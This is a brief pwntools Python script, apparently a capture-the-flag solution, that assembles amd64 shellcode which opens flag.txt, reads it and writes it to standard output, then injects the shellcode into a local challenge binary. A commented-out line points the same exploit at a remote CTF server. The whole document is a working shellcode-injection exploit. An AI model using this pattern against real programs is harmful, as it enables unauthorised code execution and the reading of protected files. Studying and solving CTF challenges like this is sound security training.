from pwn import *

context.clear(arch='amd64')


shellcode = shellcraft.linux.open("flag.txt", constants.O_RDONLY)
shellcode += shellcraft.linux.read(3, 'r9', 80)
shellcode += shellcraft.linux.write(1, 'r9', 80)

# if args.REMOTE:
#     io = remote('chal.ctf.ingeniums.club', 1340)
# else:
io = process('./chal')

# log.info(f'{shellcode}')
# log.info(f'{asm(shellcode)}')

# if args.GDB:
# gdb.attach(io)
#
io.sendline(asm(shellcode))


io.interactive()
